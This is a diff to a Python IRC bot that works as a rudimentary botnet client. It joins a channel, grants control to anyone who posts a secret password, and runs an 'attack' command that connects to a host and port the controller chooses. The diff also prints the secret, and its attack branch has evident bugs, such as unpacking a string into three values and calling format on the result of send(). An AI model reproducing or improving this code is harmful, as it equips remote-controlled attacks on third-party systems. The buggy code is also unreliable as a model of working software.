@@ -8,32 +8,31 @@ import socket
 import sys
 import time
 
-
 #slitly modifided code for spliting messages from server
 def parsemsg(s):
     #print(s)
     """Breaks a message from an IRC server into its sender, prefix, command, and arguments.
     """
     sender = ''
-    prefix = ''
+    prefixpar = ''
     trailing = []
-    command = ''
+    commandpar = ''
     if not s:
         print("no response from server")
     if s[0] == ':':
-        prefix, s = s[1:].split(' ', 1)
-        if prefix.find('!') != -1:
-            sender, prefix = prefix.split("!", 1)
+        prefixpar, s = s[1:].split(' ', 1)
+        if prefixpar.find('!') != -1:
+            sender, prefixpar = prefixpar.split("!", 1)
         else:
             sender = None
     if s.find(' :') != -1:
         s, trailing = s.split(' :', 1)
-        args = s.split()
-        args.append(trailing)
+        argspar = s.split()
+        argspar.append(trailing)
     else:
-        args = s.split()
-    command = args.pop(0)
-    return sender, prefix, command, args
+        argspar = s.split()
+    commandpar = argspar.pop(0)
+    return sender, prefixpar, commandpar, argspar
 
 #ping message
 def isping(s, sock):
@@ -78,6 +77,7 @@ try:
     port = int(sys.argv[2])
     channel = '#' + sys.argv[3]
     secret = sys.argv[4]
+    print(secret)
 except ValueError:
     print("invalid input: ", sys.argv[2])
 
@@ -91,22 +91,23 @@ while not shutoff:
     while not issocket:
         try:
             ircsocket.connect((socket.gethostbyname(hostname), port))
+            issocket = True
             time.sleep(1)
         except socket.timeout:
-            issocket = -1
+            issocket = False
             time.sleep(5)
         except OSError:
             print("cannot connect to ircserver")
-            issocket = -1
+            issocket = False
             time.sleep(5)
     #loop until a user use the secret password
     if not isconnected:
         try:
+            time.sleep(1)
             while not isname:
                 ircsocket.send("NICK {}\r\n".format(botname).encode("utf-8")) #TODO check to see if nickname is in use
                 ircsocket.send("USER {} 0 * {}\r\n".format(botname, botname).encode("utf-8"))
                 isname = True
-            time.sleep(1)
             ircsocket.send("JOIN {}\r\n".format(channel).encode("utf-8"))
         except OSError:
             print("failed to connect to channel")
@@ -121,17 +122,47 @@ while not shutoff:
             #print('user: ', user)
             if len(args) < 2:
                 pass
-            elif args[1] == "status\r\n":
-                print("i am here")
-            elif "attack" in args[1]:
+
+            #if secret is used, user is added to the list of super users
+            elif secret in args[1]:
+                if user not in poweruser:
+                    poweruser.append(user)
+                    print("found poweruser: ", user)
+
+            #send a status message to all the super users
+            elif args[1] == "status\r\n" and user in poweruser:
+                try:
+                    ircsocket.send("PRIVMSG {} :{}\r\n".format(user, botname).encode("utf-8"))
+                    print("PRIVMSG {} :{}\r\n".format(user, botname).encode("utf-8"))
+                    print("message sent")
+                except OSError:
+                    print("failed to identify self")
+
+            #attempt to attack the network
+            elif "attack" in args[1] and user in poweruser:
+                try:
+                    nouse, attackhost, attackport = args[1]
+                    attacksocket = socket.socket()
+                    attacksocket.connect((socket.gethostbyname(attackhost), int(attackport)))
+                    ircsocket.send("PRIVMSG {} :attack sucessful\r\n").format(user).encode("utf-8")
+                except socket.timeout:
+                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n").format(user).encode("utf-8")
+                except OSError:
+                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n").format(user).encode("utf-8")
+                except ValueError:
+                    pass
                 print("attack is found")
-            elif "move" in args[1]:
+
+            #move to a different channel
+            elif "move" in args[1] and user in poweruser:
                 print("move is found")
+
+            #close this bot
             elif args[1] == "shutdown\r\n":
                 shutoff = True
                 break
 
-            
+
 
     except OSError:
         print("failed to recive from socket")
